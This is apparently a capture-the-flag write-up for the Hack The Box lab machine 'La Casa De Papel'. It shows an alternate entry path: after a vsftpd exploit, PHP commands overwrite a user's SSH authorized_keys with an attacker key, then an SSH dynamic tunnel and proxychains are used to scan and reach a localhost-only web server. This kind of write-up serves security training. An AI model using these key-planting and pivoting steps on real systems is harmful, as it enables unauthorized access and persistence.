
# La Casa De Papel

Alternate way to get into the box, we don't need to do any certificate to log in as in the intended way.

Generate a new rsa public/private key with ssh-keygen, take the public key id_rsa.pub lets convert to base64, and call it PAYLOADBASE64


Log into the nc port 6200 after exploiting vsftd where we have a limited php enviroment, we have to upload the payload to /home/dali/.ssh/authorized_keys (we can overwrite it)
```
$>nc 10.10.10.131 6200
unlink("/home/dali/.ssh/authorized_keys");
fwrite(fopen("/home/dali/.ssh/authorized_keys","w+"),base64_decode("PAYLOADBASE64"));
```

Now we can log it using ssh to test the id_rsa we generated before, but we are not doing any command stuff, we just use it to enable a dynamic tunnel with the machine.

```
$>ssh -i id_rsa -D 1080 dali@10.10.10.131
```

In other terminal, using proxychains we can scan the ports that are open only for local connections

```
$>proxychains nmap -sT -n -Pn 127.0.0.1 -p-

PORT     STATE SERVICE
8000/tcp open  http-alt
```

Port 8000 is open, and if we scan it we can see that is a web server, is the same webserver we can browse if we use the intented way of entering the machine, but locally we don't need any certificate.

```
$>proxychains curl 127.0.0.1:8000
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:8000-<><>-OK
<li><a href="?path=SEASON-1">SEASON-1</a></li><li><a href="?path=SEASON-2">SEASON-2</a></li><li><strong>Select a season</strong></li>
```

You have here also a python script to upload a public key and the private id_rsa file to enable the dynamic tunnel

